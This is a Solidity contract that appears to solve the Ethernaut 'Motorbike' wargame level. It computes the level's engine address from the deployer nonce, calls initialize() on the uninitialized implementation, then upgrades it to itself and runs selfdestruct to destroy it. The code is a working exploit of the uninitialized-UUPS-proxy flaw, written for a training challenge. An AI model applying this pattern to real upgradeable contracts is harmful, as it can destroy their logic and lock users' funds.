// SPDX-License-Identifier: MIT

pragma solidity ^0.7;

interface Engine {
    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external;
}

contract MotorbikeExploiter {
    address constant ethernaut = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address constant motorbikeLevel =
        0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    address motorbike;

    function exploit(uint256 nonce) public {
        (bool success, ) = ethernaut.call(
            abi.encodeWithSignature(
                "createLevelInstance(address)",
                motorbikeLevel
            )
        );
        require(success, "Failed to create motorbike instance");

        Engine engine = Engine(computeAddress(motorbikeLevel, nonce));
        motorbike = computeAddress(motorbikeLevel, nonce + 1);

        engine.initialize();
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destroyEngine()")
        );
    }

    function destroyEngine() external {
        selfdestruct(payable(0));
    }

    function computeAddress(address deployer, uint256 nonce)
        public
        pure
        returns (address)
    {
        // The integer zero is treated as an empty byte string, and as a result it only has a length prefix, 0x80, computed via 0x80 + 0.
        if (nonce == 0x00)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            deployer,
                            bytes1(0x80)
                        )
                    )
                );
        // A one byte integer uses its own value as its length prefix, there is no additional "0x80 + length" prefix that comes before it.
        if (nonce <= 0x7f)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            deployer,
                            uint8(nonce)
                        )
                    )
                );

        // Nonces greater than 1 byte all follow a consistent encoding scheme, where each value is preceded by a prefix of 0x80 + length.
        if (nonce <= 2**8 - 1)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd7),
                            bytes1(0x94),
                            deployer,
                            bytes1(0x81),
                            uint8(nonce)
                        )
                    )
                );
        if (nonce <= 2**16 - 1)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd8),
                            bytes1(0x94),
                            deployer,
                            bytes1(0x82),
                            uint16(nonce)
                        )
                    )
                );
        if (nonce <= 2**24 - 1)
            return
                addressFromLast20Bytes(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd9),
                            bytes1(0x94),
                            deployer,
                            bytes1(0x83),
                            uint24(nonce)
                        )
                    )
                );

        return
            addressFromLast20Bytes(
                keccak256(
                    abi.encodePacked(
                        bytes1(0xda),
                        bytes1(0x94),
                        deployer,
                        bytes1(0x84),
                        uint32(nonce)
                    )
                )
            );
    }

    function addressFromLast20Bytes(bytes32 bytesValue)
        private
        pure
        returns (address)
    {
        return address(uint160(uint256(bytesValue)));
    }

    function submitLevelInstance() public {
        // submit the instance
        (bool success, ) = ethernaut.call(
            abi.encodeWithSignature("submitLevelInstance(address)", motorbike)
        );
        require(success, "Failed to submit level instance");
    }
}
